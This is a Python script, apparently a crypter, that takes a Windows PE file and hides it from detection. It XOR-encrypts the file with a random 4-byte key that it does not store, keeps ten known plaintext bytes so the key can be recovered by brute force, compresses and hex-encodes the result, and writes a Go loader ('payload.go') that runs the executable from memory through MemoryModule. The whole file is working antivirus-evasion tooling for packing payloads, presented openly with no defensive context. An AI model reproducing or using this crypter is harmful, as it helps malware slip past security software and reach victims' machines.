#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import zlib
from random import randint
from struct import pack

import stub_go

def xor(block):
    key = randint(0,42949672)
    key_tab = pack('<L',key)
    encrypted = b""
    i = 0
    for ch in block:
        byte = key_tab[i%4]
        t = ch ^ byte
        encrypted += bytes([t])
        i += 1
    return encrypted

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:", sys.argv[0], "<PE file>")
        exit(-1)
    pefile = sys.argv[1]
    payload = open(pefile, 'rb').read()

    print("[*] Encrypting payload...")
    encrypted = xor(payload)

    print("[*] Compressing payload...")
    encrypted = zlib.compress(encrypted)

    print("[*] Generating source file...")
    encrypted = ''.join(format(c, '02x') for c in encrypted)
    plain = payload[0:10]
    known_bytes = ''.join(format(c, '02x') for c in plain)
    source = stub_go.peloader.format(encrypted, known_bytes)
    repl = '''/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"
'''
    source = source.replace('import "C"', repl)
    with open('payload.go', 'w') as f:
        f.write(source)    
    f.close()

    print("[*] You should now build payload.go")
